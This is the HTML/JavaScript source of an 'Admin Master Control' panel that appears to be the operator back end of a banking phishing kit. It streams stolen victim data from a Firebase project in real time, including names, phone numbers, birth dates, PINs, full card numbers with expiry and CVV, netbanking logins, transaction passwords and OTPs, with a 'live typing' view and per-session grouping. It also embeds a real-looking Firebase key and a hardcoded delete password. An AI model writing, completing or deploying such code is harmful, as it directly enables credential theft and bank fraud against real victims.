<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Panel - Master Control</title>

  <style>
    body { font-family: Arial, sans-serif; background:#f4f4f4; margin:0; padding-bottom: 50px; }
    h2 { text-align:center; color:#00169e; margin-top:20px; text-transform: uppercase; letter-spacing: 1px; }

    .nav-buttons {
      display:flex; flex-wrap:wrap; justify-content:center;
      gap:10px; margin:20px; position: sticky; top: 0; background: #f4f4f4; padding: 10px; z-index: 1000;
      border-bottom: 1px solid #ddd;
    }
    .nav-buttons button {
      background:#00169e; color:white; border:none;
      padding:10px 16px; border-radius:10px;
      font-weight:bold; cursor:pointer; transition: 0.3s; font-size: 12px;
    }
    .nav-buttons button:hover { background: #000b52; transform: scale(1.05); }
    .btn-group { background: #28a745 !important; }

    .section {
      display:none; margin:0 auto 30px;
      padding:20px; background:white;
      border-radius:10px;
      box-shadow:0 0 8px rgba(0,0,0,0.1);
      max-width: 900px; width: 95%;
    }
    .section.active { display:block; }
    h3 { color: #00169e; border-bottom: 2px solid #00169e; padding-bottom: 10px; margin-top: 0; }

    .entry {
      background:#f9f9f9; border:1px solid #ddd;
      padding:15px; border-radius:10px;
      margin-bottom:15px; position: relative;
      border-left: 5px solid #00169e;
    }

    .delete-btn {
      background:red; color:white; border:none; 
      padding:6px 12px; border-radius:6px; 
      float:right; font-weight:bold; cursor:pointer;
    }

    .copy-btn {
      background: #00169e; color: white; border: none;
      padding: 3px 8px; border-radius: 4px;
      font-size: 11px; cursor: pointer; margin-left: 8px;
    }

    .time {
      font-size:12px; color:gray;
      margin-top:10px; display:block; font-style: italic;
    }

    .sid-tag { font-size: 10px; color: #888; display: block; margin-top: 5px; }
    .label-tag { background: #00169e; color: white; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-bottom: 8px; display: inline-block; }
    
    hr { border: 0; border-top: 1px solid #eee; margin: 10px 0; }
    b { color: #333; }
    p { margin: 8px 0; font-size: 15px; }

    #liveCont .entry { border-left-color: #ff0000; background: #fffdfd; }
    #groupedCont .entry { border-left-color: #28a745; background: #f8fff9; }
  </style>

  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
</head>

<body>

<h2>Admin Master Control</h2>

<div class="nav-buttons">
  <button onclick="showSection('liveSection')">🔴 Live View</button>
  <button onclick="showSection('groupedSection')" class="btn-group">📁 Grouped Data</button>
  <button onclick="showSection('usersSection')">User</button>
  <button onclick="showSection('dobPinSection')">DOB + PIN</button>
  <button onclick="showSection('txnPasswordSection')">Txn</button>
  <button onclick="showSection('cardPaymentSection')">Card</button>
  <button onclick="showSection('netbankingSection')">NetBanking</button>
  <button onclick="showSection('otpSection')">OTP</button>
</div>

<div id="liveSection" class="section active"><h3>🔴 Real-time Live Typing</h3><div id="liveCont"></div></div>
<div id="groupedSection" class="section"><h3>📁 Grouped Sessions (User Wise)</h3><div id="groupedCont"></div></div>
<div id="usersSection" class="section"><h3>👤 User Details</h3><div id="usersCont"></div></div>
<div id="dobPinSection" class="section"><h3>📅 DOB + PIN</h3><div id="dobCont"></div></div>
<div id="txnPasswordSection" class="section"><h3>🔑 Txn Password</h3><div id="txnCont"></div></div>
<div id="cardPaymentSection" class="section"><h3>💳 Card Payments</h3><div id="cardCont"></div></div>
<div id="netbankingSection" class="section"><h3>🏦 NetBanking</h3><div id="netCont"></div></div>
<div id="otpSection" class="section"><h3>📲 OTP Entries</h3><div id="otpCont"></div></div>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
  authDomain: "ss22-a96d3.firebaseapp.com",
  projectId: "ss22-a96d3"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

function showSection(id) {
  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
  document.getElementById(id).classList.add('active');
  if(id === 'groupedSection') loadGroupedData();
}

function formatTime(ts){
  if(!ts) return "Updating...";
  return ts.toDate().toLocaleString();
}

function copyToClipboard(text) {
  if(!text || text === "---") return;
  navigator.clipboard.writeText(text).then(() => alert("Copied")).catch(e => console.log(e));
}

function deleteEntry(collection, docId){
  const pass = prompt("Enter delete password:");
  if(pass==="4542"){
    db.collection(collection).doc(docId).delete().then(()=>alert("Deleted")).catch(e=>alert(e));
  } else alert("Wrong password");
}

// 1. Live Typing (FIXED CVV/EXP)
db.collection("live_typing").orderBy("timestamp","desc").onSnapshot(snap=>{
  const cont = document.getElementById("liveCont");
  cont.innerHTML = "";
  snap.forEach(doc=>{
    const d = doc.data();
    const cp = (v) => (v && v !== "---") ? `<button class="copy-btn" onclick="copyToClipboard('${v}')">Copy</button>` : '';
    // Sabhi variables ko handle karne ke liye multiple keys check ki hain
    const cardNum = d.card || d.cardNumber || "---";
    const expiry = d.expiry || d.exp || "---";
    const cvv = d.cvv || "---";

    cont.innerHTML += `
      <div class="entry">
        <p><span class="label-tag" style="background:red;">LIVE</span> <b>ID:</b> ${doc.id}</p>
        <p><b>Name:</b> ${d.name || "---"} ${cp(d.name)} | <b>Mob:</b> ${d.mobile || "---"}</p>
        <p><b>DOB:</b> ${d.dob || "---"} | <b>PIN:</b> <span style="color:green">${d.pin || "---"}</span></p>
        <hr>
        <p><b>Card:</b> ${cardNum} ${cp(cardNum)}</p>
        <p><b>Expiry:</b> ${expiry} | <b>CVV:</b> <span style="color:red">${cvv}</span></p>
        <p><b>Bank User:</b> ${d.username || "---"} | <b>Pass:</b> ${d.password || "---"}</p>
        <p><b>TXN Pass:</b> <span style="color:orange">${d.txnPassword || "---"}</span></p>
        <p><b>LIVE OTP:</b> <span style="color:red; font-size:18px; font-weight:bold;">${d.otp || "---"}</span></p>
        <span class="time">Update: ${formatTime(d.timestamp)}</span>
      </div>`;
  });
});

// 2. Grouped Sessions (FIXED CVV/EXP)
async function loadGroupedData() {
  const cont = document.getElementById("groupedCont");
  cont.innerHTML = "<p>Grouping Data... Please wait.</p>";
  const collections = ["users1", "dob_pin", "txn_passwords", "payments", "otp_entries"];
  let master = {};

  for (const col of collections) {
    const snap = await db.collection(col).get();
    snap.forEach(doc => {
      const d = doc.data();
      const sid = d.sessionId || "Unknown";
      if (!master[sid]) master[sid] = [];
      master[sid].push({ type: col, data: d });
    });
  }

  cont.innerHTML = "";
  for (const sid in master) {
    let box = `<div class="entry"><b>SESSION: ${sid}</b><hr>`;
    master[sid].forEach(item => {
      const d = item.data;
      if(item.type === "users1") box += `<p>👤 ${d.name} | ${d.mobile}</p>`;
      if(item.type === "dob_pin") box += `<p>📅 DOB: ${d.dob} | PIN: ${d.pin}</p>`;
      if(item.type === "payments") {
         if(d.method === "netbanking") {
            box += `<p>🏦 ${d.bank} | U: ${d.username} | P: ${d.password}</p>`;
         } else {
            // Card details fix
            box += `<p>💳 ${d.method}: ${d.card} | <b>Exp:</b> ${d.expiry} | <b>CVV:</b> <span style="color:red">${d.cvv}</span></p>`;
         }
      }
      if(item.type === "otp_entries") box += `<p>📲 OTP: <b style="color:red">${d.otp}</b> (Try: ${d.attempt})</p>`;
      if(item.type === "txn_passwords") box += `<p>🔑 TXN: ${d.password}</p>`;
    });
    cont.innerHTML += box + `</div>`;
  }
}

// Baaki listeners as it is (No changes needed)
db.collection("users1").orderBy("timestamp","desc").onSnapshot(snap=>{
  const cont = document.getElementById("usersCont");
  cont.innerHTML = "";
  snap.forEach(doc=>{
    const d=doc.data();
    cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('users1','${doc.id}')">Delete</button>
      <p><b>Name:</b> ${d.name} | <b>Mob:</b> ${d.mobile}</p>
      <span class="sid-tag">ID: ${d.sessionId || 'N/A'}</span>
      <span class="time">${formatTime(d.timestamp)}</span></div>`;
  });
});

db.collection("dob_pin").orderBy("timestamp","desc").onSnapshot(snap=>{
  const cont = document.getElementById("dobCont");
  cont.innerHTML = "";
  snap.forEach(doc=>{
    const d=doc.data();
    cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('dob_pin','${doc.id}')">Delete</button>
      <p><b>DOB:</b> ${d.dob} | <b>PIN:</b> ${d.pin}</p>
      <span class="sid-tag">ID: ${d.sessionId || 'N/A'}</span>
      <span class="time">${formatTime(d.timestamp)}</span></div>`;
  });
});

db.collection("txn_passwords").orderBy("timestamp","desc").onSnapshot(snap=>{
  const cont = document.getElementById("txnCont");
  cont.innerHTML = "";
  snap.forEach(doc=>{
    const d=doc.data();
    cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('txn_passwords','${doc.id}')">Delete</button>
      <p><b>Pass:</b> ${d.password}</p>
      <span class="sid-tag">ID: ${d.sessionId || 'N/A'}</span>
      <span class="time">${formatTime(d.timestamp)}</span></div>`;
  });
});

db.collection("payments").orderBy("timestamp","desc").onSnapshot(snap=>{
  const cCont = document.getElementById("cardCont");
  const nCont = document.getElementById("netCont");
  cCont.innerHTML = ""; nCont.innerHTML = "";
  snap.forEach(doc=>{
    const d = doc.data();
    let h = `<div class="entry"><button class="delete-btn" onclick="deleteEntry('payments','${doc.id}')">Delete</button>`;
    if(d.method === "netbanking") {
      h += `<p>🏦 ${d.bank} | U: ${d.username} | P: ${d.password}</p>`;
      nCont.innerHTML += h + `<span class="sid-tag">ID: ${d.sessionId || 'N/A'}</span><span class="time">${formatTime(d.timestamp)}</span></div>`;
    } else {
      h += `<p>💳 ${d.method}: ${d.card} | <b>Exp:</b> ${d.expiry} | <b>CVV:</b> ${d.cvv}</p>`;
      cCont.innerHTML += h + `<span class="sid-tag">ID: ${d.sessionId || 'N/A'}</span><span class="time">${formatTime(d.timestamp)}</span></div>`;
    }
  });
});

db.collection("otp_entries").orderBy("timestamp","desc").onSnapshot(snap=>{
  const cont = document.getElementById("otpCont");
  cont.innerHTML = "";
  snap.forEach(doc=>{
    const d=doc.data();
    cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('otp_entries','${doc.id}')">Delete</button>
      <p><b>OTP:</b> <span style="color:red; font-size:20px; font-weight:bold;">${d.otp}</span></p>
      <p>Attempt: ${d.attempt}</p>
      <span class="sid-tag">ID: ${d.sessionId || 'N/A'}</span>
      <span class="time">${formatTime(d.timestamp)}</span></div>`;
  });
});
</script>
</body>
</html>
